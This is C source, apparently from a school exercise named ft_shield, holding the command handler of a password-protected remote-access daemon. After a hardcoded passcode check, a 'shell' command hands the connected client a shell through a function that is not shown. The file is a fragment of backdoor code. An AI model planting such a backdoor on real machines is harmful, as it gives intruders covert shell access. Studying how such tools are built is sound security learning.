#include "ft_shield.h"

void handle_handshake(t_client *client, char *input)
{
	dprintf(2, "HANDSHAKE INPUT [%s]\n", input);
	if (client->status == HANDSHAKE)
	{
		if (strcmp(PASSCODE, input) != 0) {
			dprintf(2, "Invalid KEY\n");
			return ;
		}
		dprintf(2, "Valid KEY\n");
		client->status = CONNECTED;
	}
	// send(client->fd, "$> ", 3, 0);
}

int	handle_commands(t_client *client, char *input)
{
	if (strcmp("clear", input) == 0)
	{
		send(client->fd, CLEAR_CODE, sizeof(CLEAR_CODE), 0);
	}
	else if (strcmp("shell", input) == 0)
	{
		dprintf(2, "client_fd: %d\n", client->fd);
		shell_function((void*)(long)client->fd);
		client->fd = 0;
	}
	else if (strcmp("?", input) == 0 || strcmp("help", input) == 0)
	{
		send(client->fd, HELP, sizeof(HELP), 0);
	}
	else
	{
		// send(client->fd, "$> ", 3, 0);
	}
	return (0);
}

int handle_input(t_client *client, char *buffer)
{
	char	*input = ft_strtrim(buffer, TRIM_CHARS);
	int		fd;

	dprintf(2, "readed: [%s]\n", input);
	if (client->status == HANDSHAKE)
		handle_handshake(client, input);
	else if (client->status == CONNECTED)
		fd = handle_commands(client, input);
	free(input);
	return (fd);
}
